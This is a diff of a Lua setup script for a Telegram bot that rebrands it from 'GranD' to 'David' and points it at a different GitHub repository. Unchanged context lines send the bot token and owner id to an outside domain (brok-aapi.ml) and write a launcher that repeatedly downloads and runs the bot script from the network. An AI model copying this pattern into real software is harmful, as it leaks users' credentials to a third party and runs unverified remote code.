@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "XXKXX"
+s = "W5555"
 
-q = "aaaaw"
+q = "L9L9L"
 
 token = "]]..Token..[["
 
@@ -67,28 +67,28 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://brok-aapi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
-print("::GranD::")
-local RunBot = io.open("GranD", 'w')
+print("::David::")
+local RunBot = io.open("David", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/GranD
+cd $HOME/David
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr GranD.lua
-wget "https://raw.githubusercontent.com/SourceGranD/GranD/master/GranD.lua"
+rm -fr David.lua
+wget "https://raw.githubusercontent.com/DavidTeam0/David/master/David.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./GranD.lua -p PROFILE --bot=$token
+./tg -s ./David.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/GranD
+cd $HOME/David
 while(true) do
 rm -fr ../.telegram-cli
-screen -S GranD -X kill
-screen -S GranD ./GranD
+screen -S David -X kill
+screen -S David ./David
 done
 ]])
 RunTs:close()
